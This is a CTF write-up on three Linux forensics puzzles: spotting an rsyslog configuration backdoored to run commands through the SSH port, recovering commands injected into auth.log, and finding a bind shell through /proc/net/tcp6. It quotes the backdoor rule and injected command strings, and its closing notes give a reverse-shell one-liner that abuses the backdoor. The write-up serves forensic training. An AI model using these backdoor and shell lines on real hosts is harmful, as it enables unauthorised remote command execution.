---
title: "5Charlie CTF - Aperture"
date: 2020-04-25 01:31:48 -0500
categories: 
- write-up
tags:
- ctf
- write-up
- forensics
- linux
---

A write-up of the Aperture Linux live system forensics challenge from 5Charlie CTF.

## Aperture 1

## Aperture 1 - Challenge

To access these challenges, ssh to wheatley@analysis.5charlie.com

What is the full path to the configuration file that has been backdoored to allow command execution through OpenSSH?

**Attachments:** `id_wheatly` - SSH Key

### Aperture 1 - Solution

Getting our bearings on the system we very quickly find that this system is a very minimal isolated Docker container.
Let's try to figure out what may have been played with by figuring out the most recently modified files

We'll specifically be using the `-t (sort by modifcation time)` flag and `-r (reverse sorting)` flag on our `ls` so that it gives us the most likely files closest to our prompt at the bottom.

{% highlight bash %}
cd /
ls -latr
{% endhighlight %}

``` text
total 80
drwxr-xr-x   2 root root 4096 Apr 24  2018 home
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   1 root root 4096 Mar 11 21:03 usr
drwxr-xr-x   2 root root 4096 Mar 11 21:03 srv
drwxr-xr-x   2 root root 4096 Mar 11 21:03 opt
drwxr-xr-x   2 root root 4096 Mar 11 21:03 mnt
drwxr-xr-x   2 root root 4096 Mar 11 21:03 media
drwxr-xr-x   2 root root 4096 Mar 11 21:03 lib64
drwxr-xr-x   1 root root 4096 Mar 11 21:05 var
drwx------   2 root root 4096 Mar 11 21:05 root
dr-xr-xr-x  13 root root    0 Apr 10 19:45 sys
drwxr-xr-x   1 root root 4096 Apr 13 04:57 lib
drwxr-xr-x   1 root root 4096 Apr 13 04:57 sbin
drwxr-xr-x   1 root root 4096 Apr 13 04:58 bin
-rwxr-xr-x   1 root root    0 Apr 25 06:36 .dockerenv
drwxr-xr-x   1 root root 4096 Apr 25 06:36 ..
drwxr-xr-x   1 root root 4096 Apr 25 06:36 .
dr-xr-xr-x 142 root root    0 Apr 25 06:36 proc
drwxr-xr-x   1 root root 4096 Apr 25 06:36 run
drwxr-xr-x   5 root root  400 Apr 25 06:36 dev
drwxr-xr-x   1 root root 4096 Apr 25 06:36 etc
drwxrwxrwt   1 root root 4096 Apr 25 06:36 tmp
wheatley@e2a54f310336:/$
```

There's nothing of interest in `/tmp` so next we dig into `/etc` which has plenty of configuration files that could be tweaked to cause security problems.

Let's continue down.

{% highlight bash %}
cd /
ls -latr
{% endhighlight %}

``` text
...[truncated]
drwxr-xr-x 1 root root    4096 Apr 13 04:57 rc4.d
drwxr-xr-x 1 root root    4096 Apr 13 04:57 rc3.d
drwxr-xr-x 1 root root    4096 Apr 13 04:57 rc2.d
-rw-r--r-- 1 root root    1252 Apr 13 04:57 passwd-
-rw-r--r-- 1 root root   13548 Apr 13 04:57 ld.so.cache
-rw-r--r-- 1 root root      22 Apr 13 04:58 subuid
-rw-r--r-- 1 root root      22 Apr 13 04:58 subgid
-rw-r----- 1 root shadow   691 Apr 13 04:58 shadow
-rw-r--r-- 1 root root    1297 Apr 13 04:58 passwd
-rw-r----- 1 root shadow   499 Apr 13 04:58 gshadow
-rw-r--r-- 1 root root     596 Apr 13 04:58 group
-rw-r--r-- 1 root root      36 Apr 13 04:58 ld.so.preload
drwxr-xr-x 1 root root    4096 Apr 13 04:58 ssh
drwxr-xr-x 1 root root    4096 Apr 13 04:58 rsyslog.d
lrwxrwxrwx 1 root root      12 Apr 25 06:36 mtab -> /proc/mounts
drwxr-xr-x 1 root root    4096 Apr 25 06:36 ..
-rw-r--r-- 1 root root     174 Apr 25 06:36 hosts
-rw-r--r-- 1 root root      13 Apr 25 06:36 hostname
-rw-r--r-- 1 root root      97 Apr 25 06:36 resolv.conf
-rw-r--r-- 1 root root    1358 Apr 25 06:36 rsyslog.conf
-r--r----- 1 root root     755 Apr 25 06:36 sudoers
drwxr-xr-x 1 root root    4096 Apr 25 06:36 .
wheatley@e2a54f310336:/etc$
```

Attempting to check our sudo privileges with `sudo -l` gives us a password prompt: no dice.

`hosts`, `hostname`, `resolv.conf`, and `mtab` were modified by Docker coming up. We can look, but it's nothing relevant.

`rsyslog.conf` and `rsyslog.d` were recently modified; that's a bit strange. Looking up rsyslog backdoors gives us Jacob Lell's post as the first result: <https://www.jakoblell.com/blog/2014/05/07/hacking-contest-backdooring-rsyslogd/>

In our own `/etc/rsyslog.d/rsyslog-README.conf` we can immediately see `auth.* ^/bin/atg` on line 77: an exact match to the blog post.

**Flag:** `/etc/rsyslog.d/rsyslog-README.conf`

## Aperture 2

### Aperture 2 - Challenge

What is the flag sent to the backdoored service?

### Aperture 2 - Solution

The backdoor commands are logged in `/var/log/auth.log` because it operates on the same port as SSH.

We can see that (if you tested connecting yourself) `auth.log` logs the attempts as `Bad protocol version identification <cmd>`.

To find the flag sent to the service historically, we can grep for that.

{% highlight bash %}
cat /var/log/auth.log | grep 'Bad proto'
{% endhighlight %}

``` text
Apr 13 04:33:58 5985561554b6 sshd[632]: Bad protocol version identification '';echo ZmxhZ3thbHdheXNfY2hlY2tfeW91cl9sb2dzfQo=;'' from 172.19.0.2 port 46120
Apr 13 04:34:37 5985561554b6 sshd[878]: Bad protocol version identification '';touch /tmp/owned;'' from 172.19.0.2 port 46122
wheatley@e2a54f310336:/etc$
```

We see a base64 encoded string, which, when decoded, gives us our flag.

**Flag:** `flag{always_check_your_logs}`

## Aperture 3

### Aperture 3 - Challenge

What port on this host is hosting a malicious bind shell?

### Aperture 3 - Solution

Since this host doesn't have anything like `netstat` or `ss`, we'll need to examine the `/proc` directory to determine open ports.

Nothing of interest in `/proc/net/tcp` or `/proc/net/udp`.

But if we look at `/proc/net/tcp6` we notice can see that there is a port bound to the wildcard (`::` aka the repeating zeros on index 1) with a port of hexidecimal `19B7`.

``` text
wheatley@09f81ab696ac:/tmp$ cat /proc/net/tcp6
  sl  local_address                         remote_address                        st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000000000000000000000000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2142157 1 ffff888153b1cc80 100 0 0 10 0
   1: 00000000000000000000000000000000:19B7 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 2142057 1 ffff888153b1ee80 100 0 0 10 0
```

Converting that port to decimal, we have our flag.

``` text
➜  ~ python3
Python 3.6.9 (default, Apr 18 2020, 01:56:04)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x19B7
6583
```

**Flag:** `6583`

## Additional Notes

I have a bad habit of losing focus in CTFs a bit and playing around with the environment. Here is a line to leverage the provided backdoor as a shell instead of single-command.

{% highlight bash %}
nc -nvlp 1234 &
echo "';bash -i >& /dev/tcp/127.0.0.1/1234 0>&1;'"|nc 127.0.0.1
fg
{% endhighlight %}
